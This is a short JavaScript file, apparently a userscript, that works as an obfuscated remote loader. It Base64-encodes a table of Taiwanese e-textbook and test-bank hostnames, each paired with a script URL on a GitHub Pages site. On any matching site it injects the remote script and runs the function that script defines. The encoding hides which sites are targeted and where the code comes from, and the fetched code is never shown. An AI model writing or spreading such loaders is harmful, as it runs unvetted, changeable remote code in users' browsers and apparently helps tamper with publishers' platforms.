(function() {
    'use strict';
    function loadScript(src, callback) {
        var script = document.createElement('script');
        script.src = src;
        script.type = 'text/javascript';
        script.onload = callback;
        document.head.appendChild(script);
    }
    const scriptMap = { 'd2ViZXRleHRib29rLmtuc2guY29tLnR3': 'aHR0cHM6Ly9DbGlmZmVyeS5naXRodWIuaW8vYWlvL3MyLmpz', 'ZGlnaXRhbG1hc3Rlci5rbnNoLmNvbS50dw==': 'aHR0cHM6Ly9DbGlmZmVyeS5naXRodWIuaW8vYWlvL3MyLmpz', 'ZWJvb2swMi5jaGlkaW5nLmNvbS50dw==': 'aHR0cHM6Ly9DbGlmZmVyeS5naXRodWIuaW8vYWlvL3M0Lmpz', 'cmVmZXJlbmNlLmhsZS5jb20udHc=': 'aHR0cHM6Ly9DbGlmZmVyeS5naXRodWIuaW8vYWlvL3MzLmpz', 'ZWRpc2MzLmhsZS5jb20udHc=': 'aHR0cHM6Ly9DbGlmZmVyeS5naXRodWIuaW8vYWlvL3MzLmpz', 'dGVzdGJhbmsuaGxlLmNvbS50dw==': 'aHR0cHM6Ly9DbGlmZmVyeS5naXRodWIuaW8vYWlvL3MzLmpz', 'amVuLXBpbi5jb20udHc=': 'aHR0cHM6Ly9DbGlmZmVyeS5naXRodWIuaW8vYWlvL3M1Lmpz', 'cmVhZGVyLm9uZWNsYXNzLmNvbS50dw==': 'aHR0cHM6Ly9DbGlmZmVyeS5naXRodWIuaW8vYWlvL3MxLmpz', 'b25lYm94Mi5vbmVjbGFzcy5jb20udHc=': 'aHR0cHM6Ly9DbGlmZmVyeS5naXRodWIuaW8vYWlvL3MxLmpz', 'bmFuaWJveDMub25lY2xhc3MuY29tLnR3': 'aHR0cHM6Ly9DbGlmZmVyeS5naXRodWIuaW8vYWlvL3MxLmpz', 'bmFuaXBhcGVyLm9uZWNsYXNzLmNvbS50dw==': 'aHR0cHM6Ly9DbGlmZmVyeS5naXRodWIuaW8vYWlvL3MxLmpz' }, currentDomain = btoa(unescape(encodeURIComponent(window.location.hostname))), scriptMapDomain = decodeURIComponent(escape(atob(scriptMap[currentDomain])));
    if (scriptMapDomain) {
        loadScript(scriptMapDomain, function() {
            const scriptFunction = window[currentDomain];
            if (typeof scriptFunction === 'function') { scriptFunction(); }
        });
    }
})();
